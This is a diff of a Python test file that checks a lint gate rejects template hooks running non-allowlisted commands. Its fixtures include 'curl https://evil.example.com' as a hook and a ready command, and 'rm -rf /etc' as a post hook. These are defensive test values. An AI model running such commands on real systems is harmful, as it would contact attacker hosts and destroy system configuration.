@@ -185,6 +185,35 @@ def test_lint_all_against_real_sources_passes():
 def test_lint_all_rejects_a_bad_snippet(monkeypatch, tmp_path):
     """A synthetic sources/ tree with a hostile hook must fail. Proves
     the gate is reading sources, not a cached artifact."""
+    _synthetic_sources(monkeypatch, tmp_path, {
+        "quiesce": {
+            "pre": "curl https://evil.example.com",
+            "post": "rm -rf /etc",
+            "timeout_seconds": 30,
+        },
+    })
+    assert L.lint_all() == 1
+
+
+def test_lint_all_rejects_a_foreign_ready_command(monkeypatch, tmp_path, capsys):
+    """The ready question runs inside the application container before
+    every update phase, so it gets the lifecycle allowlist too."""
+    _synthetic_sources(monkeypatch, tmp_path, {
+        "lifecycle": {
+            "service": "app",
+            "ready": ["curl", "https://evil.example.com"],
+            "migrate": [["php", "occ", "db:add-missing-indices"]],
+            "timeout_seconds": 60,
+        },
+    })
+    assert L.lint_all() == 1
+    out = capsys.readouterr().out
+    assert "synthetic-bad.lifecycle.ready: starts with non-allowlisted" in out
+
+
+def _synthetic_sources(monkeypatch, tmp_path, catena: dict) -> None:
+    """Point the loader at a one-template sources/ tree whose x-catena
+    block carries `catena` on top of the required fields."""
     sources = tmp_path / "sources"
     sources.mkdir()
     blueprint = tmp_path / "blueprints" / "synthetic-bad"
@@ -198,17 +227,13 @@ def test_lint_all_rejects_a_bad_snippet(monkeypatch, tmp_path):
         "categories": ["Testing"],
         "platform": "linux",
         "x-catena": {
+            **catena,
             "app_name": "synthetic-bad",
             "upstream_url": "https://example.com",
             "sso_mode": "none",
             "domain": {"host": "x.example.com", "service": "app", "port": 80},
             "env_defaults": ["DOMAIN_HOST=x.example.com"],
             "bench": {"pack": "nodb"},
-            "quiesce": {
-                "pre": "curl https://evil.example.com",
-                "post": "rm -rf /etc",
-                "timeout_seconds": 30,
-            },
             "sizing": {"peak_ram_mb": 128},
             "en": {
                 "display_name": "Synthetic",
@@ -232,4 +257,3 @@ def test_lint_all_rejects_a_bad_snippet(monkeypatch, tmp_path):
     )
     monkeypatch.setattr(model, "SOURCES", sources)
     monkeypatch.setattr(model, "BLUEPRINTS", tmp_path / "blueprints")
-    assert L.lint_all() == 1
